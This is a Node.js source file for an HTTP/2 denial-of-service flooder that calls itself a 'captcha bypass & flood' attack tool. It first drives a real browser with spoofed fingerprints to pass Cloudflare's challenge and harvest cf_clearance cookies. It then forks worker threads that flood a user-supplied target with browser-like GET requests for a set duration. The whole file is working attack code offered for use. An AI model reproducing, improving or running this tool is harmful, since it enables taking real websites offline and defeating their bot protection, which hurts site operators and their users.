const { connect } = require('puppeteer-real-browser');
const { FingerprintGenerator } = require('fingerprint-generator');
const timers = require('timers/promises');
const chalk = require('chalk');
const { spawn, exec } = require('child_process');
const fs = require('fs');
const cluster = require('cluster');
const colors = require('colors');
const os = require('os');
const axios = require('axios');
const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const url = require("url");
const crypto = require("crypto");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 5){
    console.log(`Usage: node cbypass.js URL TIME REQ_PER_SEC THREADS\nExample: node ddos.js https://target.com 120 10 5`); 
    process.exit();
}

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";

const secureOptions = 
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_client_method";
const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: sigalgs,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};
const secureContext = tls.createSecureContext(secureContextOptions);

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5]
}

const parsedTarget = new URL(args.target);
let currentCookies = [];
let cookieRefreshInterval;
let userAgents = [];

try {
    userAgents = fs.readFileSync("ua.txt", "utf-8").toString().split(/\r?\n/).filter(l => l);
} catch (e) {
    userAgents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0"
    ];
}

async function bypassCloudflare() {
    console.log(chalk.white("[*] Launching real browser to bypass Cloudflare..."));
    
    try {
        const fingerprintGenerator = new FingerprintGenerator({
            devices: ['desktop'],
            browsers: ['chrome', 'firefox', 'edge', 'safari'],
            operatingSystems: ['windows', 'macos', 'linux']
        });
        
        const { browser, page } = await connect({
            headless: false,
            turnstile: true,
            fingerprint: true,
            args: [
                "--no-sandbox",
                "--disable-setuid-sandbox",
                "--disable-web-security",
                "--disable-features=IsolateOrigins,site-per-process",
                "--disable-blink-features=AutomationControlled",
                "--window-size=1920,1080",
                "--start-maximized"
            ],
            connectOption: {
                defaultViewport: null
            }
        });

        console.log(chalk.white("[*] Navigating to target..."));
        await page.goto(args.target, { 
            waitUntil: 'networkidle2', 
            timeout: 60000 
        });

    
        console.log(chalk.white("[*] Waiting for Cloudflare challenge to complete..."));
        await timers.setTimeout(15000);

    
        const cookies = await page.cookies();
        const cookieString = cookies.map(c => `${c.name}=${c.value}`).join('; ');
        
      
        const cfCookie = cookies.find(c => c.name === 'cf_clearance');
        if (cfCookie) {
            console.log(chalk.green(`[+] Cloudflare bypass successful! cf_clearance: ${cfCookie.value.substring(0, 20)}...`));
        } else {
            console.log(chalk.white("[!] No cf_clearance cookie found, but continuing..."));
        }

       
        fs.writeFileSync('cookies.txt', cookieString);
        console.log(chalk.green(`[+] Saved ${cookies.length} cookies to cookies.txt`));

        await browser.close();
        return cookieString;

    } catch (error) {
        console.log(chalk.red("[-] Cloudflare bypass error:"), error.message);
        return null;
    }
}

async function refreshCookieLoop() {
    console.log(chalk.white("[*] Getting initial Cloudflare cookies..."));
    
    const cookie = await bypassCloudflare();
    if (cookie) {
        currentCookies = [cookie];
        console.log(chalk.green("[+] Initial cookies obtained"));
    }

    if (currentCookies.length === 0) {
        try {
            const fileCookies = fs.readFileSync('cookies.txt', 'utf-8');
            if (fileCookies) {
                currentCookies = [fileCookies];
                console.log(chalk.green("[+] Loaded cookies from file"));
            }
        } catch (e) {}
    }

    cookieRefreshInterval = setInterval(async () => {
        console.log(chalk.blue("[*] Refreshing Cloudflare cookies..."));
        const newCookie = await bypassCloudflare();
        if (newCookie) {
            currentCookies = [newCookie];
            console.log(chalk.green("[+] Cookies refreshed"));
        }
    }, 120000);
}

function parseCookie(cookieStr) {
    return cookieStr.split(';').map(c => c.trim()).join('; ');
}

class NetSocket {
    constructor(){}

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true
        });

        connection.setTimeout(options.timeout * 10000);
        connection.setKeepAlive(true, 10000);
        connection.setNoDelay(true);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

const Socker = new NetSocket();

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    if (!elements || elements.length === 0) return null;
    return elements[randomIntn(0, elements.length)];
}

function runFlooder() {
    const headers = {
        ":method": "GET",
        ":path": parsedTarget.pathname,
        ":scheme": "https",
        ":authority": parsedTarget.host,
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "accept-encoding": "gzip, deflate, br",
        "cache-control": "no-cache, no-store,private, max-age=0, must-revalidate",
        "sec-ch-ua-mobile": randomElement(["?0", "?1"]),
        "sec-ch-ua-platform": randomElement(["Android", "iOS", "Linux", "macOS", "Windows"]),
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "upgrade-insecure-requests": "1",
        "user-agent": randomElement(userAgents)
    };

    if (currentCookies.length > 0) {
        headers["cookie"] = parseCookie(randomElement(currentCookies));
    }

    const connection = net.connect(443, parsedTarget.host, { allowHalfOpen: true });

    connection.setKeepAlive(true, 60000);
    connection.setNoDelay(true);

    const tlsOptions = {
        socket: connection,
        ALPNProtocols: ["h2"],
        ciphers: ciphers,
        sigalgs: sigalgs,
        ecdhCurve: ecdhCurve,
        honorCipherOrder: false,
        rejectUnauthorized: false,
        secureOptions: secureOptions,
        secureContext: secureContext,
        servername: parsedTarget.host,
        secureProtocol: secureProtocol
    };

    const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);

    tlsConn.allowHalfOpen = true;
    tlsConn.setNoDelay(true);
    tlsConn.setKeepAlive(true, 60 * 1000);

    const client = http2.connect(parsedTarget.href, {
        protocol: "https:",
        settings: { enablePush: false, initialWindowSize: 1073741823 },
        maxSessionMemory: 3333,
        maxDeflateDynamicTableSize: 4294967295,
        createConnection: () => tlsConn
    });

    client.settings({ enablePush: false, initialWindowSize: 1073741823 });

    client.on("connect", () => {
        const IntervalAttack = setInterval(() => {
            for (let i = 0; i < args.Rate; i++) {
                headers["referer"] = "https://" + parsedTarget.host + parsedTarget.pathname;
                
                const request = client.request(headers)
                    .on("response", () => {
                        request.close();
                        request.destroy();
                    });
                
                request.end();
            }
        }, 1000);

        client.on("close", () => {
            clearInterval(IntervalAttack);
            client.destroy();
            connection.destroy();
        });

        client.on("error", () => {
            clearInterval(IntervalAttack);
            client.destroy();
            connection.destroy();
        });
    });

    client.on("error", () => {
        client.destroy();
        connection.destroy();
    });
}
async function main() {
//attack launch ui
    console.log(chalk.green("[*] LAUNCHED ATTACK - CAPTCHA BYPASS & FLOOD"));
    console.log(chalk.white(`[*] Target: ${args.target}`));
    console.log(chalk.white(`[*] Time: ${args.time}s`));
    console.log(chalk.white(`[*] Rate: ${args.Rate}/s per thread`));
    console.log(chalk.white(`[*] Threads: ${args.threads}`));
    
    if (!fs.existsSync('ua.txt')) {
        const uas = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0"
        ];
        fs.writeFileSync('ua.txt', uas.join('\n'));
    }
    
    await refreshCookieLoop();
    
    if (cluster.isMaster) {
        for (let counter = 1; counter <= args.threads; counter++) {
            cluster.fork();
        }
        console.log(chalk.green(`[+] Started ${args.threads} flood threads`));
    } else {
        setInterval(runFlooder, 0);
    }
    
    setTimeout(() => {
        if (cookieRefreshInterval) clearInterval(cookieRefreshInterval);
        console.log(chalk.green("\n[*] Attack finished!"));
        process.exit(0);
    }, args.time * 1000);
}

if (cluster.isMaster) {
    main().catch(console.error);
} else {
    setInterval(runFlooder, 0);
}

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
